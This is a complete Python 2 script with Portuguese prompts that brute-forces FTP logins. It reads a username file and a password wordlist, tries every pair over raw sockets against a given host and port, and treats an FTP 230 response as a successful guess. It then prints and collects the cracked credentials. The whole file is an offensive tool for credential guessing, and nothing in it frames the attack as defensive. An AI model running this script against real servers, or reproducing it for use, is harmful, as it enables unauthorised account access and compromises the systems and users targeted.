#!/usr/bin/python
import sys
import socket
import re

if len(sys.argv) != 5:
	print "\nModo de uso: %s host porta user wordlistPass"%(sys.argv[0])
	print "Exemplo: %s 192.168.1.8 2121 root senhas.txt"%(sys.argv[0])
	sys.exit()

host = sys.argv[1]
port = sys.argv[2]
user = open(sys.argv[3])
pwl = sys.argv[4]
resp = []
print '\n'

def brute(linha):
	with open(pwl) as pw:
		for p in pw:
			saida = "Tentando %s:%s"%(linha, p)
			print saida.strip()

			ftp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			ftp.connect((host, int(port)))
			ftp.recv(1024)
			ftp.send('USER '+linha+'\r\n')
			ftp.recv(1024)
			ftp.send('PASS '+p+'\r\n')
			banner = ftp.recv(1024)
			if re.search('230', banner):
				enc = "Senha encontrada -----------------> %s:%s"%(linha,p)
				enc = enc.strip()
				print enc
				resp.append(enc)
			else:
				ftp.close()
	pw.close()


print "\nINICIANDO BRUTE FORCE NO HOST "+host+":"+port+'\n'
for u in user:
	u = u.strip()
	brute(u)


if len(resp) > 0:
	print "\nSENHAS ENCONTRADAS:\n"
	for i in resp:
		print i
	print "\n"
	user.close()
else:
	print "\nNENHUMA SENHA ENCONTRADA.\n"

